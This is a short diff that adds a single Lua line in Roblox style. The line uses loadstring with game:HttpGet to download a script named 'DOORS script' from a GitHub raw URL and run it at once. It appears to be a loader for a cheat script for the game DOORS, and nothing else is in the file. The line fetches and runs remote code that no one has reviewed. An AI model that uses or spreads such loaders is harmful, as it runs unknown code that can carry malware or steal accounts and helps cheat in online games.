@@ -1,0 +1,3 @@
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/3EloHIyChay123123/test/main/DOORS%20script", true))()
